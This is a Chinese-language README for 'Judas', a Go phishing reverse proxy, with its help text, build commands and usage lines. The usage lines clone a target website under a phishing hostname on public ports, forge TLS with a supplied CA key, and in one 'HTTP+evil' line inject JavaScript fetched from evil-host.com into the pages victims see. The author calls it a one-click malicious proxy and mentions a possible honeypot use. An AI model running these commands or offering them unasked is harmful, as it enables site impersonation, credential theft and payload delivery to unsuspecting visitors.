Judas
=====

[英文（原版）wiki](https://github.com/JonCooperWorks/judas)

```
admin@admin judas % go run cmd/judas.go -h
Usage of judas:
  -address string
    	Address and port to run proxy service on. Format address:port. (default "localhost:8080")
  -inject-js string
    	URL to a JavaScript file you want injected.
  -insecure
    	Listen without TLS.
  -insecure-target
    	Not verify SSL certificate from target host.
  -plugins string
    	Colon separated file path to plugin binaries.
  -proxy string
    	Optional upstream proxy. Useful for torification or debugging. Supports HTTPS and SOCKS5 based on the URL. For example, http://localhost:8080 or socks5://localhost:9150.
  -proxy-ca-cert string
    	Proxy CA cert for signed requests
  -proxy-ca-key string
    	Proxy CA key for signed requests
  -ssl-hostname string
    	Hostname for SSL certificate
  -target string
    	The website we want to phish.
  -with-profiler
    	Attach profiler to instance.
```

## Building

Building `judas`

```
go build -trimpath -ldflags "-s -w" cmd/judas.go
```

Building `plugin`

```
go build -buildmode=plugin -trimpath -ldflags "-s -w"  examples/loggingplugin/loggingplugin.go
```
> `plugin` 功能无法在 `windows` 上使用

## 用法

HTTP

```
./judas --target https://target-url.com --insecure --address=0.0.0.0:80
```

HTTPS

```
./judas --target https://target-url.com --insecure --ssl-hostname phishingsite.com --address=0.0.0.0:443
```

HTTPS+Certificates

```
./judas -proxy-ca-cert cert.pem -proxy-ca-key privkey.pem -target https://target-url.com -ssl-hostname baidu.com -address 0.0.0.0:443
```

HTTP+proxy

```
./judas --target https://target-url.com --insecure --address=0.0.0.0:80 --proxy socks5://localhost:1080
```

HTTP+evil

```
./judas --target https://target-url.com --insecure --address=0.0.0.0:80 --inject-js https://evil-host.com/payload.js
```

## 其他

Judas在我看来不仅仅可以做一个便捷的恶意反代（一键插入恶意js代码或者中间人），还可以结合插件成为一个web蜜罐。

插件我在作者原有的 `searchloggingplugin` 以外，我增加了几个例子：`loggingplugin`(按日保存request) 、`responseprintplugin`(控制台输出response)、 `requestprintplugin`(控制台输出request)。

希望大家有想法可以一起共同交流